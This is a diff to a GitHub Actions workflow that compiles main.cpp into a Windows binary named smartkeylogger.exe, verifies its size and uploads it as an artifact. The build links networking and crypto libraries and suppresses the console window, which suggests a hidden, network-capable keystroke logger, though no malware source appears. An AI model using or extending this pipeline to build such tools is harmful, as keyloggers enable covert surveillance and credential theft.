@@ -1,4 +1,4 @@
-name: Build with MSVC
+name: Build Smart Keylogger
 
 on: [push, workflow_dispatch]
 
@@ -9,34 +9,32 @@ jobs:
     steps:
     - uses: actions/checkout@v4
     
-    - name: Setup MSVC
-      uses: microsoft/setup-msbuild@v1.3
-      
-    - name: Build
-      shell: cmd
+    - name: Build with MSVC
       run: |
-        "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvars64.bat"
-        cl.exe main.cpp ^
-          /Fe:smartkeylogger.exe ^
-          /EHsc ^
-          /O2 ^
-          /MT ^
-          /link ^
-          /SUBSYSTEM:WINDOWS ^
-          winhttp.lib user32.lib shell32.lib ole32.lib kernel32.lib ^
-          gdi32.lib crypt32.lib iphlpapi.lib ws2_32.lib advapi32.lib wininet.lib ^
-          /DEBUG:NONE ^
+        & "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvars64.bat"
+        cl.exe main.cpp `
+          /Fe:smartkeylogger.exe `
+          /EHsc `
+          /O2 `
+          /MT `
+          /link `
+          /SUBSYSTEM:WINDOWS `
+          winhttp.lib user32.lib shell32.lib ole32.lib kernel32.lib `
+          gdi32.lib crypt32.lib iphlpapi.lib ws2_32.lib advapi32.lib wininet.lib `
+          /DEBUG:NONE `
           /OPT:REF
-        
-    - name: Check if file exists
+      shell: pwsh
+      
+    - name: Verify build
       run: |
-        if exist smartkeylogger.exe (
-          echo File created successfully
-          dir smartkeylogger.exe
-        ) else (
-          echo File not found
+        if (Test-Path "smartkeylogger.exe") {
+          $size = (Get-Item "smartkeylogger.exe").Length
+          Write-Host "✅ Build successful! File size: $size bytes" -ForegroundColor Green
+        } else {
+          Write-Host "❌ Build failed - file not found" -ForegroundColor Red
+          Get-ChildItem -Filter "*.exe" -ErrorAction SilentlyContinue
           exit 1
-        )
+        }
         
     - name: Upload artifact
       uses: actions/upload-artifact@v4
